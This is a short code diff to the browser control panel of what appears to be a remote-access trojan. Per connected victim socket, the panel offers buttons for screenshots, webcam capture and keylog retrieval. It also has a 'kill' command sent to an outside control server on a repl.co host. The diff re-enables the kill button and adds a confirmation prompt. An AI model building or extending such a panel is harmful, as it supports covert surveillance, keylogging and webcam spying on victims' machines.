@@ -20,7 +20,7 @@ function display() {
       <ion-icon name="desktop-outline" onclick="image('${socket.id}', 'screenshot')"></ion-icon>
       <ion-icon name="camera-outline" onclick="image('${socket.id}', 'webcam')"></ion-icon>
       <ion-icon name="receipt-outline" onclick="text('${socket.id}', 'keylog')"></ion-icon>
-      <!--<ion-icon name="skull-outline" onclick="kill('${socket.id}')"></ion-icon>-->
+      <ion-icon name="skull-outline" onclick="kill('${socket.id}')"></ion-icon>
     </div>`
   }
 }
@@ -45,8 +45,8 @@ function text(id, method) {
 }
 
 function kill(id) {
-  alert('correctly killed')
   let url = `https://gate-serv.kitsuforyou.repl.co/do/kill/${id}`
-  get(url)
-  window.location.reload()
+  if(confirm(`Do you really want to kill this socket ? This action is irreversible.`)) {
+    get(url)
+  }
 }
